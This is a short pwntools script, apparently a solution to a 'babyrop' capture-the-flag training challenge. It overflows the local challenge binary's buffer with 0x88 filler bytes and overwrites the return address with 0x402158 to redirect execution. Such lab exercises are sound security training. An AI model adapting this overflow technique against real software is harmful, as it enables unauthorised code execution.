from pwn import *

p = process("/challenge/babyrop_level1.1")

p.send(b"A"*0x88 + 0x402158.to_bytes(8,"little"))
all = p.recvall()
print(all.decode())